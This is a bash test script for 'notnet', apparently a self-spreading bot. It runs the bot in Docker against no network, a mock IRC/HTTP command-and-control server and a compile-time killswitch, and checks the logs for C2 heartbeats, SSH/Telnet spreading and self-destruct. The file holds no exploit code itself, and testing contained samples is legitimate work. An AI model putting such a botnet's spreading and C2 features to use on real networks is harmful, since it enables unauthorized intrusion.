#!/usr/bin/env bash
# notnet Docker test runner
# Usage: ./tests/run-tests.sh [no-net|mock-c2|killswitch|all]

set -e

COMPOSE="docker compose -f docker-compose.test.yml"
TEST_NAME="${1:-all}"

run_scenario() {
    local name="$1"
    local compose_service="$2"
    local timeout="$3"

    # A killed compose run client can leave the --rm container behind;
    # reuse of the name would silently test a STALE container.
    docker rm -f "notnet-test-$compose_service" >/dev/null 2>&1 || true

    echo "═══════════════════════════════════════════════════════"
    echo "  SCENARIO: $name"
    echo "═══════════════════════════════════════════════════════"
    echo ""

    # Build image
    echo "[1/4] Building Docker image..."
    $COMPOSE build --no-cache "$compose_service" 2>&1 | tail -5
    echo ""

    # Run with timeout
    echo "[2/4] Starting bot (timeout: ${timeout}s)..."
    local output
    $COMPOSE run --rm --name "notnet-test-$compose_service" "$compose_service" 2>&1 &
    BOT_PID=$!
    sleep "$timeout"
    kill $BOT_PID 2>/dev/null || true
    wait $BOT_PID 2>/dev/null || true
    output=$(docker logs "notnet-test-$compose_service" 2>&1 || true)

    echo ""
    echo "═══════════════════════════════════════════════════════"
    echo "  OUTPUT (last 30 lines)"
    echo "═══════════════════════════════════════════════════════"
    echo "$output" | tail -30
    echo ""

    # Check results
    echo "[3/4] Verifying results..."
    local pass=false

    if echo "$output" | grep -q "notnet"; then
        echo "  ✓ Binary executed successfully"
        pass=true
    fi

    if echo "$output" | grep -q "scan cycle"; then
        echo "  ✓ Scan cycle executed"
    fi

    if echo "$output" | grep -q "heartbeat\|status\|PING"; then
        echo "  ✓ C2 heartbeat active"
    fi

    if echo "$output" | grep -q "SSH\|Telnet\|spread"; then
        echo "  ✓ Spreading module active"
    fi

    if echo "$output" | grep -q "PID"; then
        echo "  ✓ Self-management active"
    fi

    if ! $pass; then
        echo "  ✗ Binary did not execute"
        return 1
    fi

    echo ""
    echo "═══════════════════════════════════════════════════════"
    echo "  RESULT: PASS"
    echo "═══════════════════════════════════════════════════════"
    return 0
}

# ── Scenario C: Global killswitch (#130) ──
# Armed: image built with KILLSWITCH_DOMAIN=killswitch.test baked in
# (compile-time — no runtime config can disable it), /etc/hosts maps the
# domain to 127.0.0.1 → the bot must self-destruct at boot, exit 0,
# before any C2 connect, persistence, or spreading.
# Inert control: same baked domain, /etc/hosts maps it to 192.0.2.1 →
# the bot must boot and run normally.
run_killswitch_scenario() {
    echo "═══════════════════════════════════════════════════════"
    echo "  SCENARIO: Global killswitch (#130)"
    echo "═══════════════════════════════════════════════════════"
    echo ""

    # A killed compose run client can leave the --rm container behind;
    # reuse of the name would silently test a STALE container.
    docker rm -f notnet-test-ks-armed notnet-test-ks-inert >/dev/null 2>&1 || true

    echo "[1/5] Building killswitch test images (domain baked in)..."
    $COMPOSE build bot-killswitch-armed bot-killswitch-inert 2>&1 | tail -3
    echo ""

    echo "[2/5] Running ARMED bot (killswitch.test → 127.0.0.1)..."
    local armed_out
    armed_out=$(timeout 30 $COMPOSE run --rm --name notnet-test-ks-armed \
        bot-killswitch-armed 2>&1 || true)
    echo "$armed_out" | tail -15
    echo ""

    echo "[3/5] Verifying armed bot self-destructed..."
    local armed_pass=true
    if echo "$armed_out" | grep -q "KILLSWITCH: killswitch.test resolved to 127.0.0.1"; then
        echo "  ✓ Killswitch detected kill address"
    else
        echo "  ✗ Killswitch did NOT detect kill address"
        armed_pass=false
    fi
    if echo "$armed_out" | grep -q "global killswitch (boot)"; then
        echo "  ✓ Self-destruct fired at boot"
    else
        echo "  ✗ Self-destruct did not fire"
        armed_pass=false
    fi
    if ! echo "$armed_out" | grep -q "spread cycle started"; then
        echo "  ✓ No spreading before kill"
    else
        echo "  ✗ Bot spread before the kill — boot check order broken"
        armed_pass=false
    fi
    if $armed_pass; then
        echo "  RESULT: ARMED = PASS"
    else
        echo "  RESULT: ARMED = FAIL"
        return 1
    fi
    echo ""

    echo "[4/5] Running INERT control (killswitch.test → 192.0.2.1)..."
    $COMPOSE run --rm --name notnet-test-ks-inert bot-killswitch-inert 2>&1 &
    local inert_pid=$!
    sleep 12
    kill $inert_pid 2>/dev/null || true
    wait $inert_pid 2>/dev/null || true
    local inert_out
    inert_out=$(docker logs notnet-test-ks-inert 2>&1 || true)
    echo "$inert_out" | tail -8
    echo ""

    echo "[5/5] Verifying inert control ran normally..."
    local inert_pass=true
    if echo "$inert_out" | grep -q "KILLSWITCH"; then
        echo "  ✗ Inert bot self-destructed (false positive)"
        inert_pass=false
    else
        echo "  ✓ No self-destruct on non-kill address"
    fi
    if echo "$inert_out" | grep -q "notnet v0.1.0-dev starting"; then
        echo "  ✓ Bot booted normally"
    else
        echo "  ✗ Bot did not boot"
        inert_pass=false
    fi
    if $inert_pass; then
        echo "  RESULT: INERT = PASS"
    else
        echo "  RESULT: INERT = FAIL"
        return 1
    fi
    echo ""
    echo "═══════════════════════════════════════════════════════"
    echo "  RESULT: PASS"
    echo "═══════════════════════════════════════════════════════"
    return 0
}

case "$TEST_NAME" in
    no-net)
        run_scenario "No-Network (init + loop + shutdown)" "bot-no-net" 20
        ;;
    mock-c2)
        run_scenario "Mock C2 (IRC + HTTP)" "bot-mock-c2" 30
        ;;
    killswitch)
        run_killswitch_scenario
        ;;
    all)
        run_scenario "No-Network (init + loop + shutdown)" "bot-no-net" 20
        echo ""
        echo "───────────────────────────────────────────────────────"
        echo ""
        run_scenario "Mock C2 (IRC + HTTP)" "bot-mock-c2" 30
        echo ""
        echo "───────────────────────────────────────────────────────"
        echo ""
        run_killswitch_scenario
        ;;
    *)
        echo "Usage: $0 [no-net|mock-c2|killswitch|all]"
        echo ""
        echo "  no-net     - Test bot with no networking (init, loop, shutdown)"
        echo "  mock-c2    - Test bot with mock IRC + HTTP C2 servers"
        echo "  killswitch - Test the global killswitch (#130): armed bot dies at"
        echo "               boot, inert control runs normally"
        echo "  all        - Run all scenarios"
        exit 1
        ;;
esac
